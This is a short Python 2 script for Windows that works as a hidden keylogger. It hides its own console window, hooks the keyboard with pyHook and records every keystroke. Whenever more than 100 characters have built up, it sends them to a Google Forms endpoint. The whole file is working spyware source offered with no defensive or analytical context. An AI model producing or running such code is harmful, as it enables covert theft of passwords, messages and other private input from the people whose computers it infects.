 

import pyHook
import pythoncom
import win32console, win32gui
import urllib,urllib2
# import urllib.parse
# import urllib.request
import datetime

#Hide the Console
window = win32console.GetConsoleWindow()
win32gui.ShowWindow(window, 0)

#Initialize the log as a blank string
data=''

#Write function to write logs to text file
def LogNow():
    global data
    if len(data) > 100: 
        url = "https://docs.google.com/forms/d/e/1FAIpQLSdumwGgpIowFEdi1RSf-DssaWIBUtZYpFpHUzyltka4xZlwYQ/formResponse"  # Specify Google Form URL here
        klog = {'entry.73403991': data}  # Specify the Field Name here
        try:
            dataenc = urllib.urlencode(klog)
            # dataenc = dataenc.encode('ascii')
            req =urllib2.Request(url, dataenc)
            response = urllib2.urlopen(req)
            data = ''
        except Exception as e:
            print(e)

    return True

#Trigger the keypress event
def keypressed(event):
    global x, data
    if event.Ascii == 13:
        keys = '<ENTER>'
    elif event.Ascii == 8:
        keys = '<BACK SPACE>'
    elif event.Ascii == 9:
        keys = '<TAB>'
    else:
        keys = chr(event.KeyID)
    data = data + keys
    LogNow()
    return True

hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = keypressed
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()